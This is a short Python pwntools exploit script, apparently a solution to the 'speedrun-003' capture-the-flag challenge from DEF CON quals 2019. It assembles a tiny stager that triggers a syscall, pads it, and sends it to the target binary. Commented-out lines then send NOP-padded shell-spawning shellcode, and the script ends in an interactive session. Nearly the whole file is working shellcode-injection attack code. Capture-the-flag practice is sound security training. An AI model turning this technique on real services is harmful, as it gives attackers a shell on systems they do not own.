from pwn import *

p = process('./pwn')
#p = remote('speedrun-003.quals2019.oooverflow.io',31337)
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

p.recvuntil('your drift\n')

payload = asm(
'''
mov rdi,rax
mov rsi,rdx
mov rdx,r11
syscall
'''
)
payload += 'A'*(15-len(payload))

payload2 = payload + payload
print len(payload2)
gdb.attach(p)
p.sendline(payload2)

#sleep(1)
#shellcode = '\x90'*0xb + asm(shellcraft.sh())
#p.sendline(shellcode)

p.interactive()
